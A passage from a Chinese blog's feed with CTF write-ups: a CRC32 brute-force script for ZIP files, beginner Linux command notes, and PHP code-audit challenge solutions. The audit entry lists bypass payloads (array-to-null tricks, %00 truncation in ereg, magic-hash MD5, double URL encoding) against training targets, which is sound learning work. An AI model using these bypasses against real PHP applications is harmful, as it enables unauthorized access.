      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;  最近做的CTF题目遇到RSA加密总是不会，于是参考资料学习一番，小结自己的学习过程，怕自己某天又忘记了&lt;br&gt;RSA是属于现代密码学的范畴，现代密码学的终极目标是:发明永远无法破解的加密算法&lt;br&gt;而他们很多又是跟二进制相关，二进制加密的唯一算法  XOR&lt;br&gt;下面两个标准就很典型。。。&lt;br&gt;DES 数据加密标准&lt;br&gt;AES 高级加密标准&lt;br&gt;对于上面的东西一知半解。。什么轮子函数都没了解清楚，还有一些什么盒子之类的东西。。。emmm以后在深究吧&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="RSA" scheme="0verwatch.top/tags/RSA/"/>
    
      <category term="Crypto" scheme="0verwatch.top/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>CRC32爆破小结</title>
    <link href="0verwatch.top/2018/02/24/CRC32Brute/"/>
    <id>0verwatch.top/2018/02/24/CRC32Brute/</id>
    <published>2018-02-24T05:28:50.000Z</published>
    <updated>2018-05-20T06:48:15.603Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在bugku遇到了一道隐写题，binwalk之后发现里面有很多个压缩包。。。。。。然后就无从下手，于是查看别人大佬的wp才发现是CRC32爆破，由于本人第一次遇到这种题目，就记录一下吧。。</p><a id="more"></a><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h4 id="CRC想必大家都知道，它的全称是循环冗余校验-Cyclic-Redundancy-Check-CRC-，用来校验文件是否出错但并不能用于自动纠错。。emmmm，计组上课好像讲过，老师让我们回去自己学，记得当时只是初略了解了一下，就是在后面加上一小段冗余位去检测，详细规则谷歌一下吧。。。。"><a href="#CRC想必大家都知道，它的全称是循环冗余校验-Cyclic-Redundancy-Check-CRC-，用来校验文件是否出错但并不能用于自动纠错。。emmmm，计组上课好像讲过，老师让我们回去自己学，记得当时只是初略了解了一下，就是在后面加上一小段冗余位去检测，详细规则谷歌一下吧。。。。" class="headerlink" title="CRC想必大家都知道，它的全称是循环冗余校验(Cyclic Redundancy Check, CRC)，用来校验文件是否出错但并不能用于自动纠错。。emmmm，计组上课好像讲过，老师让我们回去自己学，记得当时只是初略了解了一下，就是在后面加上一小段冗余位去检测，详细规则谷歌一下吧。。。。"></a>CRC想必大家都知道，它的全称是循环冗余校验(Cyclic Redundancy Check, CRC)，用来校验文件是否出错但并不能用于自动纠错。。emmmm，计组上课好像讲过，老师让我们回去自己学，记得当时只是初略了解了一下，就是在后面加上一小段冗余位去检测，详细规则谷歌一下吧。。。。</h4><p><img src="http://img.blog.csdn.net/20180224131551484?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h4 id="这里我以破解四位CRC的压缩包为例。。。。写一个理解之后的脚本"><a href="#这里我以破解四位CRC的压缩包为例。。。。写一个理解之后的脚本" class="headerlink" title="这里我以破解四位CRC的压缩包为例。。。。写一个理解之后的脚本"></a>这里我以破解四位CRC的压缩包为例。。。。写一个理解之后的脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string </span><br><span class="line"></span><br><span class="line">dic=string.printable     <span class="comment">#各种打印字符</span></span><br><span class="line"></span><br><span class="line">crc = <span class="string">'''你的输入 '''</span>     <span class="comment"># 记得要以0x开头</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackCrc</span><span class="params">(crc)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dic :</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> dic:</span><br><span class="line"><span class="keyword">for</span> q <span class="keyword">in</span> dic:</span><br><span class="line">s=i+j+p+q</span><br><span class="line"><span class="keyword">if</span> crc == (binascii.crc32(s) &amp; <span class="number">0xffffffff</span>):</span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure><p>要<strong>特别注意</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (binascii.crc32(str(i)) &amp; 0xffffffff) == crc:</span><br></pre></td></tr></table></figure><p>在 Python 2.x 的版本中，binascii.crc32 所计算出來的 CRC 值域为[-2^31, 2^31-1] 之间的有符号整数，为了要与一般CRC 结果作比对，需要将其转为无符号整数，所以加上&amp; 0xffffffff来进行转换。如果是 Python 3.x 的版本，其计算结果为 [0, 2^32-1] 间的无符号整数，因此不需额外加上&amp; 0xffffffff 。</p><p>下面就bugku那道多个压缩包为例，上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string </span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="comment"># def tansnum(s):</span></span><br><span class="line"><span class="comment">#     return int(s, 16)  转十六进制</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dic=string.printable</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackCrc</span><span class="params">(crc)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dic :</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> dic:</span><br><span class="line"><span class="keyword">for</span> q <span class="keyword">in</span> dic:</span><br><span class="line">s=i+j+p+q</span><br><span class="line"><span class="keyword">if</span> crc == (binascii.crc32(s) &amp; <span class="number">0xffffffff</span>):</span><br><span class="line"><span class="keyword">print</span> s</span><br><span class="line"><span class="comment">#return </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getcrc32</span><span class="params">()</span>:</span></span><br><span class="line">l=[]</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> range(<span class="number">68</span>):</span><br><span class="line">file = <span class="string">'out'</span> + str(b) + <span class="string">'.zip'</span></span><br><span class="line">f = zipfile.ZipFile(file,<span class="string">'r'</span>)</span><br><span class="line">GetCrc = f.getinfo(<span class="string">'data.txt'</span>)</span><br><span class="line">crc = GetCrc.CRC</span><br><span class="line">l.append(hex(crc))</span><br><span class="line"><span class="keyword">return</span> l</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__  == <span class="string">"__main__"</span>:</span><br><span class="line"><span class="comment">#c = open('out.txt', 'w')</span></span><br><span class="line">l = getcrc32()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">   CrackCrc(i)</span><br><span class="line"><span class="comment">#c.close()</span></span><br></pre></td></tr></table></figure><p>如果上面的python操作zip文件还不太懂的话看看这个:(<a href="http://www.cnblogs.com/sun-haiyu/p/7082063.html，简单的来说就是用ZipFile读取文件，用getinfo函数获取信息。。。" target="_blank" rel="noopener">http://www.cnblogs.com/sun-haiyu/p/7082063.html，简单的来说就是用ZipFile读取文件，用getinfo函数获取信息。。。</a><br><strong>特别注意</strong>，上面的脚本跑这一题十分慢，我跑了差不多40分钟都没跑完。。。效率极低，所以啊有空我还是学习一下多线程该怎么跑。。。</p><h4 id="另外还有一款很好用的6位的CRC32爆破"><a href="#另外还有一款很好用的6位的CRC32爆破" class="headerlink" title="另外还有一款很好用的6位的CRC32爆破"></a>另外还有一款很好用的6位的CRC32爆破</h4><p>附上神器：(<a href="http://github.com/theonlypwner/crc32" target="_blank" rel="noopener">http://github.com/theonlypwner/crc32</a><br>具体使用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python crc32.py reverse 你的crc32密文</span><br></pre></td></tr></table></figure><p>这里的密文记得加上0x变成16进制。。。即可非常迅速的爆破出对应的数据，举个例子</p><p><img src="http://img.blog.csdn.net/20180224132328424?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>这里就有点哈西冲突的体现了^_^</p><p>这个CRC32爆破一旦超过六位，我觉得毫无疑义，毕竟密码超过7位你爆破需要花很长的时间，对于这个也一样。。。。<br>这就从另外一个角度诠释了什么叫无法破解的密码(#^.^#)，虽然这一个东西也会出现类似哈希冲突的现象。。。。。。</p><p>参考文章<br><a href="http://www.360zhijia.com/360anquanke/217342.html" target="_blank" rel="noopener">http://www.360zhijia.com/360anquanke/217342.html</a><br><a href="http://skysec.top/2017/06/19/CRC爆破总结/" target="_blank" rel="noopener">http://skysec.top/2017/06/19/CRC爆破总结/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近在bugku遇到了一道隐写题，binwalk之后发现里面有很多个压缩包。。。。。。然后就无从下手，于是查看别人大佬的wp才发现是CRC32爆破，由于本人第一次遇到这种题目，就记录一下吧。。&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="CRC32爆破" scheme="0verwatch.top/tags/CRC32%E7%88%86%E7%A0%B4/"/>
    
      <category term="Misc" scheme="0verwatch.top/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>熟悉Linux命令~~~</title>
    <link href="0verwatch.top/2018/02/23/Linuxcaiji/"/>
    <id>0verwatch.top/2018/02/23/Linuxcaiji/</id>
    <published>2018-02-23T08:41:13.000Z</published>
    <updated>2018-05-20T06:53:49.212Z</updated>
    
    <content type="html"><![CDATA[<p>发现自己对Linux命令不太熟悉还是学习一下吧<br><a id="more"></a></p><h1 id="分区：把大硬盘分为小的逻辑分区"><a href="#分区：把大硬盘分为小的逻辑分区" class="headerlink" title="分区：把大硬盘分为小的逻辑分区"></a>分区：把大硬盘分为小的逻辑分区</h1><h2 id="系统分区"><a href="#系统分区" class="headerlink" title="系统分区"></a>系统分区</h2><ol><li>主分区 最多只能有四个</li><li>扩展分区 最多只能有一个，也就是说主分区家扩展分区最多只能有四个，不能写入数据，只能包含逻辑分区</li><li>逻辑分区</li></ol><p>格式化 为了写入文件系统….在linux中任何内容都是文件</p><p>硬件设备文件名 /dev/…    第一个’/‘代表的是根目录，dev目录下保存的都是硬件设备文件名 </p><p>根目录下的bin和sbin，usr目录下的bin和sbin这四个目录都是用来保存系统命令的<br>/etc/ 目录下一般都是配置文件<br>/lib/  目录下一般都是Linux的函数库<br>proc和sys 目录不应该 操作，这两个目录保存的是内存德过载点<br>所以不应该在Linux下任何一个文件夹内乱写东西，可以在家目录root或home，以及temp目录下随便放内容</p><h1 id="挂载：给每个分区分配挂载点–-gt-相当于Windows下的盘符"><a href="#挂载：给每个分区分配挂载点–-gt-相当于Windows下的盘符" class="headerlink" title="挂载：给每个分区分配挂载点–&gt;相当于Windows下的盘符"></a>挂载：给每个分区分配挂载点–&gt;相当于Windows下的盘符</h1><h2 id="必须要有的分区"><a href="#必须要有的分区" class="headerlink" title="必须要有的分区"></a>必须要有的分区</h2><ol><li>‘/‘根分区</li><li>swap分区(交换分区，内存2倍，不超过2GB，类似与虚拟内存，内存不够用，可以用里面的当内存使用)</li><li>推荐分区<br>/boot  (启动分区，200MB)  这个可以不弄，到时有时候误删的时候，会导致启动不了</li></ol><h1 id="安装日志"><a href="#安装日志" class="headerlink" title="安装日志"></a>安装日志</h1><p>/root/install.log 存储了安装在系统中的软件包及版本信息<br>/root/install.log.syslog 存储了安装过程中留下的时间记录<br>/root/anaconda-ks.cfg 以Kickstart配置文件的格式记录安装过程中的选项信息</p><h1 id="Linux常用命令"><a href="#Linux常用命令" class="headerlink" title="Linux常用命令"></a>Linux常用命令</h1><h2 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h2><p><strong>命令 [选项] [参数]</strong></p><h2 id="终端几个符号的认识"><a href="#终端几个符号的认识" class="headerlink" title="终端几个符号的认识"></a>终端几个符号的认识</h2><ol><li>超级用户提示符  <code>#</code></li><li>普通用户提示符  <code>$</code></li></ol><h2 id="目录处理命令"><a href="#目录处理命令" class="headerlink" title="目录处理命令"></a>目录处理命令</h2><h3 id="pwd-显示当前目录"><a href="#pwd-显示当前目录" class="headerlink" title="pwd 显示当前目录"></a><code>pwd</code> 显示当前目录</h3><h3 id="ls-l-可以看见权限"><a href="#ls-l-可以看见权限" class="headerlink" title="ls -l 可以看见权限"></a><code>ls -l</code> 可以看见权限</h3><p>权限一共有十位<br>例如 <code>-rw-r--r--</code><br>-文件类型  （-文件 d目录 I软连接）<br><code>rw-</code>    u所有者<br><code>r--</code>    g所属组<br><code>r--</code>     o其他人<br>r读 w写 x执行</p><h3 id="建立目录"><a href="#建立目录" class="headerlink" title="建立目录"></a>建立目录</h3><p><code>mkdir -p [目录名]</code>     make dictionary<br><code>-p</code> 递归创建<br>如果没有-p只能创建单个目录，要创建一串目录加-p即可</p><h3 id="切换所在目录"><a href="#切换所在目录" class="headerlink" title="切换所在目录"></a>切换所在目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd [目录]</span><br></pre></td></tr></table></figure><p>简化操作<br><code>cd ~</code> 或者 直接一个cd进入当前用户的家目录<br><code>cd -</code> 进入上次目录<br><code>cd ..</code> 进入上级目录<br><code>cd .</code> 进入当前目录<br><code>注意</code>全部命令都有空格   </p><p><code>Ctrl+L</code>  清屏</p><h3 id="删除空目录"><a href="#删除空目录" class="headerlink" title="删除空目录"></a>删除空目录</h3><p><code>rmdir [目录名]</code>    remove empty dictionary<br>极其少用</p><h3 id="删除文件或者目录"><a href="#删除文件或者目录" class="headerlink" title="删除文件或者目录"></a>删除文件或者目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -rf</span><br></pre></td></tr></table></figure><p>选项 <code>-r</code> 删除目录<br><code>-f</code> 强制</p><h3 id="复制命令"><a href="#复制命令" class="headerlink" title="复制命令"></a>复制命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp [选项] [原文件或目录] [目标目录]</span><br></pre></td></tr></table></figure><p><code>-r</code> 复制目录<br><code>-p</code> 连带文件属性复制<br><code>-a</code> 相当于-pdr</p><h3 id="剪切或者改名命令"><a href="#剪切或者改名命令" class="headerlink" title="剪切或者改名命令"></a>剪切或者改名命令</h3><p><code>mv</code> [原文件或目录] [目标目录]<br>后边两个参数一样就是改名功能</p><h3 id="创建文件"><a href="#创建文件" class="headerlink" title="创建文件"></a>创建文件</h3><p><code>touch</code> 文件名</p><h3 id="显示文件内容"><a href="#显示文件内容" class="headerlink" title="显示文件内容"></a>显示文件内容</h3><p><code>cat</code> 文件名</p><h3 id="文件搜索命令"><a href="#文件搜索命令" class="headerlink" title="文件搜索命令"></a>文件搜索命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">locate 文件名</span><br></pre></td></tr></table></figure><p>在后台数据库中按文件名搜索，速度快<br>/var/lib/mlocate locate命令搜索的后台数据库<br><code>updatedb</code> 更新数据库，如果不强制更新的话得等一天你新建的东西才能搜索到</p><h3 id="搜索命令的命令"><a href="#搜索命令的命令" class="headerlink" title="搜索命令的命令"></a>搜索命令的命令</h3><p><code>whereis命令</code>  搜索命令所在路径及帮助文档所在位置<br>选项：  -b 只查找可执行文件 -m 只查找帮助文件</p><p>环境变量路径可以用echo $PATH查出</p><h3 id="find命令"><a href="#find命令" class="headerlink" title="find命令"></a>find命令</h3><p>举几个例子就懂<br><code>find /etc -name init</code>  在etc目录下查找文件名为init</p><p><code>find  /  -size +204800</code>  在根目录下下查找大于100MB的文件</p><p><code>find  / -user sam</code>    在根目录下查找所有者为Sam的文件<br>家有其他一些什么-ctime 属性就不一一记了，我觉得常用的就那几个</p><h3 id="压缩解压命令"><a href="#压缩解压命令" class="headerlink" title="压缩解压命令"></a>压缩解压命令</h3><p>1.压缩成gz文件的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip 文件名</span><br></pre></td></tr></table></figure><p>解压gz文件的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gunzip 压缩文件名</span><br></pre></td></tr></table></figure><p>2.压缩成.tar.gz文件<br><code>tar -zcvf  目录</code>        将一个目录打包并压缩<br>解压缩</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf   文件名</span><br></pre></td></tr></table></figure><p>还有其他的压缩命令zip与unzip,自行看看就好，哦对了突然想起来伪加密在Linux下面可以直接打开。。。。。。</p><h3 id="网络通信命令"><a href="#网络通信命令" class="headerlink" title="网络通信命令"></a>网络通信命令</h3><p><code>ping</code>命令，不多说，Windows跟linux都有</p><p>查看网络设置信息<br><code>ifconfig</code>   注意与Windows下面的ipconfig对比</p><h3 id="系统命令"><a href="#系统命令" class="headerlink" title="系统命令"></a>系统命令</h3><p><code>shutdown</code>  关机<br><code>reboot</code>  重启<br>不多说，这些跟Windows下面都是一样的</p><h1 id="Vim文本编辑器"><a href="#Vim文本编辑器" class="headerlink" title="Vim文本编辑器"></a>Vim文本编辑器</h1><p>听说这是一款强大的编辑器？。。。没有菜单只有命令<br><img src="http://img.blog.csdn.net/20180223162557792?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h2 id="插入命令"><a href="#插入命令" class="headerlink" title="插入命令"></a>插入命令</h2><ol><li><code>a</code> 在光标后面附加文本</li><li><code>i</code>  在光标前插入文本</li><li><code>o</code>  在光标下插入文本</li><li><p><code>O</code>  在光标上插入文本</p></li><li><p>还有就是上下左右键控制也行,<code>$</code>移至行尾,<code>0</code>移至行首</p></li></ol><ol start="6"><li><p><code>D</code> 删除光标处所在处到行尾</p></li><li><p><code>yy</code> 复制当前行,<code>dd</code> 剪切当前行,<code>p,P</code>  粘贴,<code>u</code>  取消上一步操作,<code>:wq</code>  保存并退出</p></li></ol><p><code>注意</code>Vim里面的命令都是要在ESC之后才可以使用。。。。。</p><h4 id="最近在家熟悉一下Linux命令。。。。。。还有Vim编辑器，我只是简单了解一下，把我认为要经常用的命令，都总结一下-可能有些零碎，毕竟是边学边记录。。。。"><a href="#最近在家熟悉一下Linux命令。。。。。。还有Vim编辑器，我只是简单了解一下，把我认为要经常用的命令，都总结一下-可能有些零碎，毕竟是边学边记录。。。。" class="headerlink" title="最近在家熟悉一下Linux命令。。。。。。还有Vim编辑器，我只是简单了解一下，把我认为要经常用的命令，都总结一下,可能有些零碎，毕竟是边学边记录。。。。"></a>最近在家熟悉一下Linux命令。。。。。。还有Vim编辑器，我只是简单了解一下，把我认为要经常用的命令，都总结一下,可能有些零碎，毕竟是边学边记录。。。。</h4>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;发现自己对Linux命令不太熟悉还是学习一下吧&lt;br&gt;
    
    </summary>
    
      <category term="Linux" scheme="0verwatch.top/categories/Linux/"/>
    
    
      <category term="Linux" scheme="0verwatch.top/tags/Linux/"/>
    
      <category term="Linux常用命令" scheme="0verwatch.top/tags/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    
  </entry>
  
  <entry>
    <title>bugku 代码审计 write up</title>
    <link href="0verwatch.top/2018/02/17/bugkuphpshenjiwp/"/>
    <id>0verwatch.top/2018/02/17/bugkuphpshenjiwp/</id>
    <published>2018-02-17T09:19:56.000Z</published>
    <updated>2018-05-20T06:51:52.563Z</updated>
    
    <content type="html"><![CDATA[<p>今天做了一波审计的题目，就记录一下吧<br><a id="more"></a></p><h2 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h2><p>查一下php手册</p><p><img src="http://img.blog.csdn.net/20180217170618173?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>本函数用来将变量从数组中导入到当前的符号表中。<br>返回成功导入到符号表中的变量数目。<br>而且这个函数没还有任何参数，很危险，直接可以修改冲突的变量<br><img src="http://img.blog.csdn.net/20180217170659398?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>关键的代码<br><img src="http://img.blog.csdn.net/20180217170646359?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>构建的payload: <code>?shiyan=&amp;flag=</code><br>因为不知道flag里面什么内容，让它变成空，然后使$content变成空，然后$shiyan变量和$content变量的内容都会被设置成空. 满足条件便会出现flag</p><h2 id="strcmp比较字符串"><a href="#strcmp比较字符串" class="headerlink" title="strcmp比较字符串"></a>strcmp比较字符串</h2><p>这题关键的函数都没给出来。。。题目说用strcmp的特性。。。<br>那我就随便个数组进去一个?a[]…flag就出来了。。尴尬</p><h2 id="urldecode二次编码绕过"><a href="#urldecode二次编码绕过" class="headerlink" title="urldecode二次编码绕过"></a>urldecode二次编码绕过</h2><p>这个题好像在实验吧做过。。。。。<br>利用了两次urldecode第一次是浏览器的解码第二次是函数的解码<br>所以我利用了里面的其中一个字母D编码第一次编码是%44，第二次编码是%2544<br>payload: <code>?id=hacker%2544J</code></p><h2 id="md5-函数"><a href="#md5-函数" class="headerlink" title="md5()函数"></a>md5()函数</h2><p>利用php的md5()函数有一个缺陷，这里是===，只能用数组处理，它无法处理数组返回null构造payload: <code>?username[]=1&amp;password[]=2</code></p><h2 id="数组返回NULL绕过"><a href="#数组返回NULL绕过" class="headerlink" title="数组返回NULL绕过"></a>数组返回NULL绕过</h2><p>首先是ereg这个正则匹配函数是处理字符串的。。。构造数组是返回null，然后的话null===false 不相等可以执行下面的else if语句。。。<br>strpos处理数组页数返回null,于是null!==false成立就得到了flag<br>payload: <code>?password[]=1</code></p><h2 id="sha-函数比较绕过"><a href="#sha-函数比较绕过" class="headerlink" title="sha()函数比较绕过"></a>sha()函数比较绕过</h2><p>关键部分还是===，只能用数组处理，利用了sha1函数处理数组返回null的特性。<br>payload: <code>?name[]=1&amp;password[]=2</code></p><h2 id="md5加密相等绕过"><a href="#md5加密相等绕过" class="headerlink" title="md5加密相等绕过"></a>md5加密相等绕过</h2><p>这一题里面是==，直接找一个MD5之后还是0e开头的即可，比如s878926199a<br>payload: <code></code></p><h2 id="十六进制与数字比较"><a href="#十六进制与数字比较" class="headerlink" title="十六进制与数字比较"></a>十六进制与数字比较</h2><p>ord() 函数返回字符串的‘首个’字符的 ASCII 值。<br>利用这一个与题目的16进制，用16进制开头的0x去绕过即可。。。<br>用Python写个脚本转换一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">num = <span class="number">3735929054</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">'%##x'</span>%num)</span><br></pre></td></tr></table></figure><p>得到<code>0xdeadc0de</code><br>payload: <code>?password=0xdeadc0de</code></p><h2 id="ereg正则-00截断"><a href="#ereg正则-00截断" class="headerlink" title="ereg正则%00截断"></a>ereg正则%00截断</h2><p>因为ereg存在%00漏洞，所以在第一个条件里面先构建一个截断绕过，然后就开始执行下面的else if语句，长度要小于8，数目要大于9999999，这里就用科学计数法，用1e8去绕过<br>下面还有一个strpos函数还要判断里面是否含有’-‘符号，所以最后的payload应该是:?password=1e8%00–,出错了。。。<br><img src="http://img.blog.csdn.net/20180217171549662?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>没办法只能找一下原题，发现人家的题目是要包含<code>*-*</code> ，但是他题目就一条横杠。。。坑了不少人。。。<br>改一下payload: <code>?password=1e8%00*-*</code> ,立刻出flag<br>查了查手册，还有个类似的函数叫eregi，只是不判断大小写罢了<br><img src="http://img.blog.csdn.net/20180217171408947?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h2 id="strpos数组绕过"><a href="#strpos数组绕过" class="headerlink" title="strpos数组绕过"></a>strpos数组绕过</h2><p>这一题跟那题数组返回NULL绕过，感觉好像是一样的。。。。。<br>就是传入的参数不一样了。。。。。<br>payload： <code>?ctf[]=1</code></p><p>后来看了看下面的文章，发现还有一个方法2：字符串截断,利用ereg()的%00截断漏洞，绕过正则过滤 <code>?nctf=1%00##biubiubiu</code> 发现是一堆乱码，<br><img src="http://img.blog.csdn.net/20180217173213598?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>这里需要特别注意， 需将##编码 <code>?nctf=1%00%23biubiubiu</code> 才能出flag。。。。</p><h2 id="给一个适合新手的学习文章："><a href="#给一个适合新手的学习文章：" class="headerlink" title="给一个适合新手的学习文章："></a>给一个适合新手的学习文章：</h2><p><a href="http://www.freebuf.com/articles/rookie/152209.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/rookie/152209.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天做了一波审计的题目，就记录一下吧&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="代码审计" scheme="0verwatch.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>bugku Web write up</title>
    <link href="0verwatch.top/2018/02/14/bugku-Web-write-up/"/>
    <id>0verwatch.top/2018/02/14/bugku-Web-write-up/</id>
    <published>2018-02-14T15:01:46.000Z</published>
    <updated>2018-05-20T05:07:42.430Z</updated>
    
